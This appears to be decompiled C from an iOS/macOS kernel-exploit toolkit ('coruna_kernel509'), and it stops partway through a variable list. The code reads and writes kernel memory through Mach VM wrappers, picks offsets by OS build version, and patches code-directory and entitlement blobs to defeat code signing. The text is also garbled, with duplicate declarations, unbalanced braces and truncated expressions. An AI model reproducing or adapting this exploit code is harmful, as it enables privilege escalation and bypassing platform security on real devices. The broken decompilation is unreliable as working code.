void coruna_kernel509_str_2b_09_40_b9_4b_39_0b_8b(byte *arg,uint64_t val,uint size,void *ctx,uint flags_2)
{
  size_t ls1;
  uint u;
  int err;
  uint *ptr;
  uint size;
  
  if (((*arg & 1) != 0) && (*(int *)(arg + 0x30) == 1)) {
    ls1 = (unsigned long)flags_2 + 8;
    ptr = _malloc(ls1);
    if (ptr != (uint *)0x0) {
      u = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
      size = (uint)ls1;
      size = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
      *ptr = u >> 0x10 | u << 0x10;
      ptr[1] = size >> 0x10 | size << 0x10;
      _memcpy(ptr + 2,ctx,(unsigned long)flags_2);
      err = coruna_kernel5_residual_266(*(uint64_t *)(arg + 0x38),val,ptr);
      if (err == -1) {
        coruna_bzero(ptr);
      }
    }
  }
  return;
}
void coruna_kernel509_via_kernel5_residual_262_2(long handle,uint size)
{
  int err;
  int status;
  uint u;
  uint size;
  uint version;
  uint port;
  uint tag;
  void *ptr;
  void *buf;
  unsigned long kind;
  
  ptr = (void *)coruna_kernel5_residual_262(handle,*(uint32_t *)(handle + 0x40),0xfade0c02);
  if ((ptr != (void *)0x0) &&
     (u = (*(uint *)((long)ptr + 0x18) & 0xff00ff00) >> 8 |
              (*(uint *)((long)ptr + 0x18) & 0xff00ff) << 8,
     u = u >> 0x10 | u << 0x10, u < size)) {
    err = *(int *)(handle + 0x48);
    status = err * (size - u);
    size = (*(uint *)((long)ptr + 4) & 0xff00ff00) >> 8 |
            (*(uint *)((long)ptr + 4) & 0xff00ff) << 8;
    kind = (unsigned long)((size >> 0x10 | size << 0x10) + status);
    buf = _malloc(kind);
    if (buf != (void *)0x0) {
      _bzero(buf,kind);
      size = (*(uint *)((long)ptr + 0x10) & 0xff00ff00) >> 8 |
              (*(uint *)((long)ptr + 0x10) & 0xff00ff) << 8;
      u = err * u;
      _memcpy(buf,ptr,(unsigned long)((size >> 0x10 | size << 0x10) - u));
      version = (*(uint *)((long)ptr + 4) & 0xff00ff00) >> 8 |
              (*(uint *)((long)ptr + 4) & 0xff00ff) << 8;
      port = (*(uint *)((long)ptr + 0x10) & 0xff00ff00) >> 8 |
              (*(uint *)((long)ptr + 0x10) & 0xff00ff) << 8;
      size = (*(uint *)((long)buf + 0x10) & 0xff00ff00) >> 8 |
              (*(uint *)((long)buf + 0x10) & 0xff00ff) << 8;
      size = (size >> 0x10 | size << 0x10) + status;
      tag = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
      *(uint *)((long)buf + 0x10) = tag >> 0x10 | tag << 0x10;
      tag = (*(uint *)((long)buf + 4) & 0xff00ff00) >> 8 |
              (*(uint *)((long)buf + 4) & 0xff00ff) << 8;
      tag = (tag >> 0x10 | tag << 0x10) + status;
      tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
      *(uint *)((long)buf + 4) = tag >> 0x10 | tag << 0x10;
      tag = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
      *(uint *)((long)buf + 0x18) = tag >> 0x10 | tag << 0x10;
      tag = (*(uint *)((long)ptr + 0x10) & 0xff00ff00) >> 8 |
              (*(uint *)((long)ptr + 0x10) & 0xff00ff) << 8;
      _memcpy((void *)((long)buf + ((unsigned long)size - (unsigned long)u)),
              (void *)((long)ptr + ((unsigned long)(tag >> 0x10 | tag << 0x10) - (unsigned long)u)),
              (unsigned long)(((version >> 0x10 | version << 0x10) + u) - (port >> 0x10 | port << 0x10)));
      u = (*(uint *)((long)ptr + 0x14) & 0xff00ff00) >> 8 |
              (*(uint *)((long)ptr + 0x14) & 0xff00ff) << 8;
      size = (*(uint *)((long)ptr + 0x10) & 0xff00ff00) >> 8 |
              (*(uint *)((long)ptr + 0x10) & 0xff00ff) << 8;
      size = size >> 0x10 | size << 0x10;
      if (size < (u >> 0x10 | u << 0x10)) {
        u = (*(uint *)((long)buf + 0x14) & 0xff00ff00) >> 8 |
                (*(uint *)((long)buf + 0x14) & 0xff00ff) << 8;
        u = (u >> 0x10 | u << 0x10) + status;
        u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
        *(uint *)((long)buf + 0x14) = u >> 0x10 | u << 0x10;
      }
      u = (*(uint *)((long)ptr + 8) & 0xff00ff00) >> 8 |
              (*(uint *)((long)ptr + 8) & 0xff00ff) << 8;
      u = u >> 0x10 | u << 0x10;
      if (0x200 < u >> 8) {
        tag = (*(uint *)((long)ptr + 0x2c) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 0x2c) & 0xff00ff) << 8;
        if (size < (tag >> 0x10 | tag << 0x10)) {
          tag = (*(uint *)((long)buf + 0x2c) & 0xff00ff00) >> 8 |
                  (*(uint *)((long)buf + 0x2c) & 0xff00ff) << 8;
          tag = (tag >> 0x10 | tag << 0x10) + status;
          tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
          *(uint *)((long)buf + 0x2c) = tag >> 0x10 | tag << 0x10;
        }
        if (0x201ff < u) {
          tag = (*(uint *)((long)ptr + 0x30) & 0xff00ff00) >> 8 |
                  (*(uint *)((long)ptr + 0x30) & 0xff00ff) << 8;
          if (size < (tag >> 0x10 | tag << 0x10)) {
            tag = (*(uint *)((long)buf + 0x30) & 0xff00ff00) >> 8 |
                    (*(uint *)((long)buf + 0x30) & 0xff00ff) << 8;
            tag = (tag >> 0x10 | tag << 0x10) + status;
            tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
            *(uint *)((long)buf + 0x30) = tag >> 0x10 | tag << 0x10;
          }
          if (0x204ff < u) {
            tag = (*(uint *)((long)ptr + 0x5c) & 0xff00ff00) >> 8 |
                    (*(uint *)((long)ptr + 0x5c) & 0xff00ff) << 8;
            if (size < (tag >> 0x10 | tag << 0x10)) {
              tag = (*(uint *)((long)buf + 0x5c) & 0xff00ff00) >> 8 |
                      (*(uint *)((long)buf + 0x5c) & 0xff00ff) << 8;
              tag = (tag >> 0x10 | tag << 0x10) + status;
              tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
              *(uint *)((long)buf + 0x5c) = tag >> 0x10 | tag << 0x10;
            }
            if ((0x205ff < u) &&
               (u = (*(uint *)((long)ptr + 100) & 0xff00ff00) >> 8 |
                        (*(uint *)((long)ptr + 100) & 0xff00ff) << 8,
               size < (u >> 0x10 | u << 0x10))) {
              u = (*(uint *)((long)buf + 100) & 0xff00ff00) >> 8 |
                      (*(uint *)((long)buf + 100) & 0xff00ff) << 8;
              u = (u >> 0x10 | u << 0x10) + status;
              u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
              *(uint *)((long)buf + 100) = u >> 0x10 | u << 0x10;
            }
          }
        }
      }
      coruna_kernel509_via_memcpy_21a64(handle,*(uint32_t *)(handle + 0x40),buf);
      _free(buf);
    }
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_17(long handle,uint64_t val)
{
  bool err;
  int err;
  long handle;
  uint64_t u;
  long addr;
  long off;
  unsigned long size;
  long base;
  long ctx_val;
  char scratch;
  
  scratch = '\0';
  err = coruna_fn_ptr_cast_10(handle,0x5184201);
  if (err == 0) {
    return;
  }
  handle = coruna_kernel509_via_kernel5_residual_269(handle,val);
  if (handle == 0) {
    return;
  }
  err = coruna_fn_ptr_cast_10(handle,0x20);
  if (err != 0) {
    off = handle + 0x92;
    coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,off,1,&scratch);
    return;
  }
  err = coruna_fn_ptr_cast_10(handle,0x5184001);
  if (err == 0) {
    err = coruna_fn_ptr_cast_10(handle,0x200);
    if (err == 0) {
      return;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x1809) {
      return;
    }
    if (err < 0x2258) {
      if (err < 0x1f53) {
        if (err < 0x1c1b) {
          off = 0xe7;
          if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
            off = 0xef;
          }
        }
        else {
          off = 0xdf;
        }
      }
      else {
        off = 0x97;
      }
    }
    else {
      off = 0x8f;
    }
    off = off + handle;
    coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,off,1,&scratch);
    return;
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x2712) {
    if (0x2257 < err) {
      err = coruna_fn_ptr_cast_10(handle,0x1180000);
      err = err == 0;
      ctx_val = 0xb9;
      if (!err) {
        ctx_val = 0xc1;
      }
      base = 0xba;
      if (!err) {
        base = 0xc2;
      }
      addr = 0xbf;
      off = 0xb7;
      if (!err) {
      off = addr;
      }
      }
      off = off + handle;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,off,1,&scratch);
      if (err == 0) {
      return;
    }
    if (0x1f52 < err) {
      u = 0x180000;
      err = coruna_fn_ptr_cast_10(handle,u);
      err = err == 0;
      ctx_val = 0xc1;
      if (!err) {
      ctx_val = 0xc9;
      }
      base = 0xc2;
      if (!err) {
      base = 0xca;
      }
      addr = 199;
      off = 0xbf;
      if (!err) {
      off = addr;
      }
      }
      off = off + handle;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,off,1,&scratch);
      if (err == 0) {
      return;
    }
    size = *(unsigned long *)(handle + 0x158);
    if (0x1c1b0a800fffff < size) {
      err = coruna_fn_ptr_cast_10(handle,0x80000);
      err = err == 0;
      ctx_val = 0x101;
      if (!err) {
        ctx_val = 0x109;
      }
      off = 0x10a;
      base = 0x102;
check_ok:
      if (!err) {
        base = off;
      }
      addr = 0x107;
      off = 0xff;
      if (!err) {
      off = addr;
      }
      }
      off = off + handle;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,off,1,&scratch);
      if (err == 0) {
      return;
    }
    if (0x1c1a < err) {
      err = coruna_fn_ptr_cast_10(handle,0x80000);
      err = err == 0;
      ctx_val = 0x100;
      if (!err) {
        ctx_val = 0x108;
      }
      off = 0x109;
      base = 0x101;
      if (!err) {
      base = off;
      }
      addr = 0x107;
      off = 0xff;
      if (!err) {
      off = addr;
      }
      }
      off = off + handle;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,off,1,&scratch);
      if (err == 0) {
      return;
    }
    ctx_val = 0x108;
    if (size < 0x18090a07900000) {
      ctx_val = 0x110;
    }
    base = 0x109;
    if (size < 0x18090a07900000) {
      base = 0x111;
    }
    off = 0x107;
    if (size < 0x18090a07900000) {
      off = 0x10f;
    }
  }
  else {
    u = 0x1180000;
cleanup:
    err = coruna_fn_ptr_cast_10(handle,u);
    err = err == 0;
    ctx_val = 0xc1;
    if (!err) {
      ctx_val = 0xc9;
    }
    base = 0xc2;
    if (!err) {
      base = 0xca;
    }
    addr = 199;
    off = 0xbf;
done:
    if (!err) {
      off = addr;
    }
  }
  off = off + handle;
  err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,off,1,&scratch);
  if (err == 0) {
    return;
  }
  if (scratch == '\0') {
    return;
  }
  err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,ctx_val + handle,1,&scratch);
  if (err == 0) {
    return;
  }
  if (scratch == '\0') {
    return;
  }
  err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,base + handle,1,&scratch);
  if (err == 0) {
    return;
  }
  if (scratch == '\0') {
    return;
  }
fail:
  coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,off,1,&scratch);
  return;
}
void coruna_kernel509_via_kernel5_residual_260(uint64_t val,uint64_t id_2,unsigned long *arg)
{
  int err;
  long handle;
  long addr;
  unsigned long scratch;
  uint bootargs;
  uint8_t thread_attr[4];
  unsigned long host_info;
  
  host_info = 0;
  handle = coruna_call_helper_25fa0();
  if (((handle != 0) && (addr = coruna_fn_ptr_cast_7(val,handle), addr != 0)) &&
     (err = coruna_kernel509_residual_307(val,addr,&host_info), err != 0)) {
    if (((uint)host_info >> 2 & 1) == 0) {
      handle = coruna_kernel509_via_fn_ptr_cast_2_4(val,handle);
      if (handle == 0) {
        return;
      }
      handle = coruna_kernel509_via_fn_ptr_cast_2_6(val,handle);
      if (handle == 0) {
        return;
      }
      err = coruna_kernel5_residual_260(val,thread_attr,&bootargs);
      if (err == 0) {
        return;
      }
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(val,handle + (unsigned long)bootargs,8,&scratch);
      if (err == 0) {
        return;
      }
    }
    else {
      scratch = host_info & 0xfffffffffffff000;
    }
    *arg = scratch;
  }
  return;
}
void coruna_kernel509_via_kernel5_residual_262_3(uint *size,uint flags_2,uint64_t val,uint64_t id_2,uint *count_3)
{
  long handle;
  long addr;
  long off;
  long base;
  long ctx_val;
  long serial;
  long serial_7;
  uint u;
  int err;
  long serial_8;
  int *err;
  int *status;
  uint *ptr;
  uint *buf;
  void *ptr;
  uint size;
  uint *str;
  uint *copy;
  unsigned long version;
  uint64_t *data;
  uint *obj;
  size_t ls22;
  uint port;
  uint tag;
  uint kind;
  uint *scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long host_info;
  long serial_buf;
  long action;
  long block_ctx;
  size_t stack_guard;
  long sa_saved;
  uint sa_new;
  
  sa_new = 0;
  stack_guard = 0;
  sa_saved = 0;
  action = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  bootargs = 0;
  thread_attr = 0;
  if (count_3 == (uint *)0x0) {
    return;
  }
  serial_8 = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_7();
  if (serial_8 == 0) {
    return;
  }
  version = *(unsigned long *)(size + 0x56);
  handle = 0x40;
  if (version < 0x1f530f02800000) {
    handle = 0x30;
  }
  addr = 0x50;
  if (version < 0x1f530f02800000) {
    addr = 0x40;
  }
  off = 0x20;
  if (version < 0x1f530f02800000) {
    off = 0x10;
  }
  base = 0x80;
  if (version < 0x1f530f02800000) {
    base = 0x78;
  }
  ctx_val = 0x88;
  if (version < 0x1f530f02800000) {
    ctx_val = 0x80;
  }
  serial = 0x90;
  if (version < 0x1f530f02800000) {
    serial = 0x88;
  }
  serial_7 = 0x28;
  if (version < 0x1f530f02800000) {
    serial_7 = 0x18;
  }
  err = coruna_kernel509_residual_307(size,serial + serial_8,&serial_buf);
  if (err == 0) {
    return;
  }
  if ((0x1f52ffffffffff < *(unsigned long *)(size + 0x56)) &&
     (err = coruna_kernel509_residual_307(size,serial_8 + 0x98,&host_info), err == 0)) {
    return;
  }
  err = coruna_kernel509_residual_307(size,base + serial_8,&block_ctx);
  if (err == 0) {
    return;
  }
  err = coruna_kernel509_residual_307(size,ctx_val + serial_8,&action);
  if (err == 0) {
    return;
  }
  err = coruna_kernel509_via_mach_vm_read_overwrite(size,off + serial_8,&sa_new);
  if (err == 0) {
    return;
  }
  if ((sa_new & 1) == 0) {
    return;
  }
  err = coruna_kernel509_residual_307(size,handle + serial_8,&stack_guard);
  if (err == 0) {
    return;
  }
  err = coruna_kernel509_residual_307(size,addr + serial_8,&sa_saved);
  if (err == 0) {
    return;
  }
  if (sa_saved == 0) {
    return;
  }
  if (stack_guard == 0) {
    return;
  }
  err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(size,serial_7 + serial_8,8,&bootargs);
  if (err == 0) {
    return;
  }
  err = _malloc(stack_guard);
  if (err == (int *)0x0) {
    return;
  }
  count_3[0x18] = 0;
  count_3[0x19] = 0;
  count_3[0x12] = 0;
  count_3[0x13] = 0;
  count_3[0x10] = 0;
  count_3[0x11] = 0;
  count_3[0x16] = 0;
  count_3[0x17] = 0;
  count_3[0x14] = 0;
  count_3[0x15] = 0;
  count_3[10] = 0;
  count_3[0xb] = 0;
  count_3[8] = 0;
  count_3[9] = 0;
  count_3[0xe] = 0;
  count_3[0xf] = 0;
  count_3[0xc] = 0;
  count_3[0xd] = 0;
  count_3[2] = 0;
  count_3[3] = 0;
  count_3[0] = 0;
  count_3[1] = 0;
  count_3[6] = 0;
  count_3[7] = 0;
  count_3[4] = 0;
  count_3[5] = 0;
  err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(size,sa_saved,stack_guard,err);
  if (err != 0) {
    *count_3 = sa_new;
    *(long *)(count_3 + 2) = serial_8;
    *(size_t *)(count_3 + 4) = stack_guard;
    *(long *)(count_3 + 6) = sa_saved;
    *(uint64_t *)(count_3 + 8) = thread_attr;
    *(uint64_t *)(count_3 + 10) = bootargs;
    count_3[0x11] = flags_2;
    err = (int)sa_saved;
    size = 0;
    if (block_ctx != 0) {
      size = (int)block_ctx - err;
    }
    count_3[0x13] = size;
    if (size < stack_guard) {
      port = 0;
      if (action != 0) {
        port = (int)action - err;
      }
      count_3[0x14] = port;
      if (((port == 0) || (port < stack_guard)) ||
         (((*size & 0x5584001) == 0 && (*(unsigned long *)(size + 0x56) < 0x1f530000000000)))) {
        port = 0;
        if (serial_buf != 0) {
          port = (int)serial_buf - err;
        }
        count_3[0x15] = port;
        if ((port == 0) || (port < stack_guard)) {
          port = 0;
          if (host_info != 0) {
            port = (int)host_info - err;
          }
          count_3[0x16] = port;
          if ((port == 0) || (port < stack_guard)) {
            if (*err == 0x20cdefa) {
              scratch = (uint *)coruna_kernel509_residual_312();
              coruna_kernel509_via_kernel5_via_bzero_5(count_3);
              status = (int *)coruna_memcpy_21a64(err);
              if (status != (int *)0x0) {
                err = coruna_kernel5_residual_266(scratch,0,status);
                if (err != -1) {
                  port = 0;
                  size = 0;
                  count_3[0xc] = 1;
                  *(uint **)(count_3 + 0xe) = scratch;
                  count_3[0x10] = 0;
                  count_3[0x17] = port;
                  serial_8 = coruna_kernel5_residual_262(count_3,size,0xfade0c02);
                  if ((serial_8 != 0) &&
                  ((((count_3[0x12] = (uint)*(byte *)(serial_8 + 0x24),
                  *(unsigned long *)(size + 0x56) < 0x1f530000000000 ||
                  (serial_8 = coruna_kernel5_residual_262(count_3,7,0xfade7172), serial_8 == 0)) ||
                  (serial_8 = coruna_kernel5_residual_262(count_3,5,0xfade7171), serial_8 != 0)) ||
                  _free(err);
                  return;
                }
cleanup:
                coruna_bzero(status);
              }
check_ok:
              coruna_kernel5_via_bzero_5(scratch);
            }
            else {
              if ((*err != -0x3ff32106) ||
                 coruna_kernel509_via_kernel5_via_bzero_5(count_3);
              port = err[2];
              if (port == 0) {
                port = 0xfffffffe;
              }
              else {
                port = (port & 0xff00ff00) >> 8 | (port & 0xff00ff) << 8;
                version = (unsigned long)(port >> 0x10 | port << 0x10);
                ptr = (uint *)(err + 4);
                port = 0;
                do {
                  u = ptr[-1];
                  tag = (*ptr & 0xff00ff00) >> 8 | (*ptr & 0xff00ff) << 8;
                  kind = tag >> 0x10 | tag << 0x10;
                  tag = kind;
                  if (port <= kind && port != 0) {
                    tag = port;
                  }
                  status = (int *)coruna_memcpy_21a64((long)err + (unsigned long)kind);
                  if (status == (int *)0x0) goto check_ok;
                  port = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
                  port = port >> 0x10 | port << 0x10;
                  err = coruna_kernel5_residual_266(scratch,port,status);
                  if (err == -1) goto cleanup;
                  if (*status == 0x20cdefa) {
                    if (size == 0) {
                      if (u == 0) {
                        port = 0;
                        goto skip;
                      }
                    }
                    else if (kind == size) {
skip:
                      count_3[0x10] = port;
                    }
                  }
                  ptr = ptr + 2;
                  version = version - 1;
                  port = tag;
                } while (version != 0);
                port = (uint)((unsigned long)tag + 0x7fffffff4 >> 3);
              }
              size = count_3[0x10];
              if (*scratch != 0) {
                version = 0;
                data = (uint64_t *)(*(long *)(scratch + 2) + 8);
                ptr = (uint *)0x0;
                str = (uint *)0x0;
                tag = 0;
                do {
                  obj = (uint *)*data;
                  u = (*obj & 0xff00ff00) >> 8 | (*obj & 0xff00ff) << 8;
                  u = u >> 0x10 | u << 0x10;
                  buf = ptr;
                  copy = str;
                  kind = tag;
                  if (u == 0xfade0c02) {
                    copy = obj;
                    if (*(uint *)(data + -1) != size) {
                      copy = str;
                    }
                  }
                  else if ((u == 0xfade7171) &&
                          (buf = obj, kind = (uint)version, *(uint *)(data + -1) != 5))
                  {
                    buf = ptr;
                    kind = tag;
                  }
                  version = version + 1;
                  data = data + 2;
                  ptr = buf;
                  str = copy;
                  tag = kind;
                } while (*scratch != version);
                if (buf != (uint *)0x0) {
                  size = (buf[1] & 0xff00ff00) >> 8 | (buf[1] & 0xff00ff) << 8;
                  version = (unsigned long)(size >> 0x10 | size << 0x10);
                  if (copy == (uint *)0x0) {
next:
                    ls22 = version + 1;
                  }
                  else {
                    size = copy[10];
                    ls22 = (size_t)size;
                    if ((size == 0) || ((size & 0x3fff) != 0)) goto next;
                  }
                  ptr = _realloc(buf,ls22);
                  if (ptr == (void *)0x0) goto check_ok;
                  _bzero((void *)((long)ptr + version),ls22 - version);
                  *(void **)(*(long *)(scratch + 2) + (unsigned long)kind * 0x10 + 8) = ptr;
                  size = count_3[0x10];
                }
              }
              count_3[0xc] = 1;
              *(uint **)(count_3 + 0xe) = scratch;
done:
              count_3[0x17] = port;
              serial_8 = coruna_kernel5_residual_262(count_3,size,0xfade0c02);
              if ((serial_8 != 0) &&
                 ((((count_3[0x12] = (uint)*(byte *)(serial_8 + 0x24),
                    *(unsigned long *)(size + 0x56) < 0x1f530000000000 ||
                    (serial_8 = coruna_kernel5_residual_262(count_3,7,0xfade7172), serial_8 == 0)) ||
                   (serial_8 = coruna_kernel5_residual_262(count_3,5,0xfade7171), serial_8 != 0)) ||
                  _free(err);
                  return;
            }
          }
        }
      }
    }
  }
fail:
  coruna_kernel509_via_kernel5_via_bzero_5(count_3);
retry:
  _free(err);
  return;
}
void coruna_kernel509_via_kernel5_residual_262_4(uint64_t val,uint64_t id_2,int flags,int count_2)
{
  unsigned long u;
  uint size;
  unsigned long version;
  int err;
  long handle;
  unsigned long port;
  unsigned long tag;
  uint8_t scratch[104];
  
  err = coruna_plist_dict(val,id_2,scratch);
  if (err != 0) {
    handle = coruna_kernel5_residual_262(scratch,0,0xfade0c02);
    if ((handle != 0) &&
       (size = (*(uint *)(handle + 8) & 0xff00ff00) >> 8 | (*(uint *)(handle + 8) & 0xff00ff) << 8,
       0x80 < (size >> 0x10 | size << 0x10) >> 10)) {
      port = *(unsigned long *)(handle + 0x50);
      u = 0x10;
      if (flags == 0) {
        u = 0;
      }
      version = (port & 0xaf00ff00ff00ff00) >> 8 | (port & 0xff00ff00ff00ff) << 8;
      version = (version & 0xffff0000ffff0000) >> 0x10 | (version & 0xffff0000ffff) << 0x10;
      tag = version >> 0x20 | version << 0x20;
      version = 0x40;
      if (count_2 == 0) {
        version = 0;
      }
      port = (port & 0xff00ff00ff00ff00) >> 8 | (port & 0xff00ff00ff00ff) << 8;
      port = (port & 0xffff0000ffff0000) >> 0x10 | (port & 0xffff0000ffff) << 0x10;
      if ((version | u | tag) != (port >> 0x20 | port << 0x20)) {
        u = (tag & 0xff00ff00ff00ff00) >> 8 | (version | u | tag & 0xff00ff00ff00ff) << 8;
        u = (u & 0xffff0000ffff0000) >> 0x10 | (u & 0xffff0000ffff) << 0x10;
        *(unsigned long *)(handle + 0x50) = u >> 0x20 | u << 0x20;
        err = coruna_kernel509_via_memcpy_21a64(scratch,0);
        if (err != 0) {
          coruna_kernel509_via_fn_ptr_cast_10_16(val,scratch);
        }
      }
    }
    coruna_kernel509_via_kernel5_via_bzero_5(scratch);
  }
  return;
}
void coruna_kernel509_via_plist_dict(uint64_t val,uint64_t id_2)
{
  int err;
  uint8_t scratch[104];
  
  err = coruna_plist_dict(val,id_2,scratch);
  if (err != 0) {
    coruna_kernel509_via_kernel5_via_bzero_5(scratch);
  }
  return;
}
void coruna_fcntl_21434(long handle,uint64_t val,long addr_2)
{
  int *err;
  unsigned long *ptr;
  long handle;
  bool err;
  int err;
  int status;
  long addr;
  unsigned long u;
  long off;
  uint64_t *buf;
  uint64_t size;
  uint version;
  void *ptr;
  int *status;
  long scratch;
  uint bootargs;
  uint thread_attr;
  long host_info;
  long serial_buf;
  uint64_t action;
  long block_ctx;
  uint64_t scratch;
  uint64_t stack_guard;
  uint32_t sa_saved;
  uint64_t bootargs;
  long sa_new;
  long path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t thread_attr;
  uint64_t host_info;
  unsigned long plist [23];
  uint64_t url_buf;
  unsigned long serial_buf;
  unsigned long json_buf;
  uint8_t frame[20];
  uint work;
  int cache [1016];
  long cache_20;
  
  cache_20 = *(long *)k_kernel_stack_chk_guard_slot;
  block_ctx = 0;
  scratch = 0;
  serial_buf = 0;
  action = 0;
  host_info = 0;
  addr = coruna_helper_16fd0_34c1c();
  u = 0;
  if ((addr == 0) ||
     (u = coruna_kernel5_residual_260(handle,(long)&scratch + 4,&scratch), (int)u == 0))
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_20) {
  return;
  }
  ___stack_chk_fail(u);
}
void coruna_kernel509_via_call_helper_25fa0(uint64_t val,uint64_t id_2,unsigned long arg)
{
  int err;
  long handle;
  unsigned long scratch;
  
  scratch = 0;
  handle = coruna_call_helper_25fa0();
  if ((((handle != 0) && (handle = coruna_fn_ptr_cast_7(val,handle), handle != 0)) &&
      (err = coruna_kernel509_residual_307(val,handle,&scratch), err != 0)) &&
     (((uint)scratch >> 2 & 1) == 0)) {
    scratch = arg & 0xfffffffffffff000 | scratch | 4;
    coruna_kernel509_residual_308(val,handle);
  }
  return;
}
void coruna_kernel5_residual_264(long handle,int flags,uint size)
{
  uint u;
  int *err;
  unsigned long size;
  
  if ((handle != 0) && (*(int *)(handle + 0x30) == 1)) {
    u = **(uint **)(handle + 0x38);
    size = (unsigned long)u;
    if (u != 0) {
      err = *(int **)(*(uint **)(handle + 0x38) + 2);
      do {
        if ((*err == flags) &&
           (u = (**(uint **)(err + 2) & 0xff00ff00) >> 8 |
                    (**(uint **)(err + 2) & 0xff00ff) << 8,
           (u >> 0x10 | u << 0x10) == size)) {
          return;
        }
        err = err + 4;
        size = size - 1;
      } while (size != 0);
    }
  }
  return;
}
void coruna_memcpy_21a64(void *ctx)
{
  uint u;
  void *ptr;
  unsigned long size;
  
  u = (*(uint *)((long)ctx + 4) & 0xff00ff00) >> 8 |
          (*(uint *)((long)ctx + 4) & 0xff00ff) << 8;
  size = (unsigned long)(u >> 0x10 | u << 0x10);
  ptr = _malloc(size);
  if (ptr != (void *)0x0) {
    _memcpy(ptr,ctx,size);
  }
  return;
}
void coruna_bzero(void *ctx)
{
  uint u;
  
  if (ctx != (void *)0x0) {
    u = *(uint *)((long)ctx + 4);
    if (u != 0) {
      u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
      _bzero(ctx,(unsigned long)(u >> 0x10 | u << 0x10));
    }
    _free(ctx);
  }
  return;
}
void coruna_pthread_create_suspended_np(long *handle)
{
  long *ptr;
  void *buf;
  uint u;
  long handle;
  uint *ptr;
  bool err;
  bool status;
  uint8_t *buf;
  bool flags;
  uint16_t size;
  int err;
  int status;
  int flags;
  int count;
  uint version;
  mach_port_t lm16;
  uint port;
  int idx;
  thread_act_t target_act;
  long addr;
  int *err;
  long off;
  void *str;
  void **lppv23;
  long base;
  uint *str;
  uint tag;
  unsigned long kind;
  unsigned long type_id;
  int *status;
  uint64_t type_id_8;
  byte count;
  unsigned long type_id_9;
  unsigned long type_id_10;
  unsigned long type_id_11;
  uint64_t scratch;
  unsigned long bootargs;
  uint thread_attr;
  uint host_info;
  unsigned long serial_buf;
  uint action;
  uint block_ctx;
  uint stack_guard;
  uint64_t sa_saved;
  uint64_t scratch;
  uint64_t sa_new;
  long path_buf;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t tmp_buf;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  long region [4];
  unsigned long plist;
  long url_buf;
  uint64_t block_ctx;
  uint64_t json_buf;
  uint64_t stack_guard;
  uint64_t frame;
  uint64_t sa_saved;
  uint64_t work;
  byte cache;
  uint8_t cache_20;
  uint cache_21;
  long cache_22;
  long cache_23;
  long cache_24;
  uint cache_25;
  uint cache_26;
  uint cache_27;
  uint64_t cache_28;
  int cache_29 [2];
  long cache_30;
  long cache_31;
  int cache_32;
  uint32_t cache_33;
  uint cache_34;
  int cache_35;
  unsigned long cache_36;
  uint cache_37;
  unsigned long cache_38;
  void *cache_39;
  uint cache_40;
  void *cache_41;
  long cache_42;
  unsigned long cache_43;
  pthread_t cache_44;
  uint cache_45;
  uint8_t cache_46[48];
  unsigned long cache_47;
  void *cache_48;
  void *cache_49;
  uint64_t cache_50;
  void *cache_51;
  unsigned long cache_52;
  uint64_t cache_53;
  unsigned long cache_54;
  uint64_t sa_new;
  unsigned long cache_55;
  uint64_t cache_56;
  long cache_57;
  unsigned long *cache_58;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t cache_59;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t cache_60;
  unsigned long json_buf;
  uint64_t cache_61;
  long cache_62;
  uint64_t cache_63;
  uint64_t frame;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_64;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_65;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_66;
  uint64_t cache_26;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t cache_67;
  uint64_t cache_29;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_68;
  uint64_t cache_32;
  uint64_t cache_33;
  uint64_t cache_34;
  uint64_t cache_69;
  uint64_t cache_35;
  uint64_t cache_36;
  uint64_t cache_37;
  uint64_t cache_70;
  uint64_t cache_38;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_71;
  uint64_t cache_41;
  uint64_t cache_42;
  uint64_t cache_43;
  uint64_t cache_72;
  uint64_t cache_44;
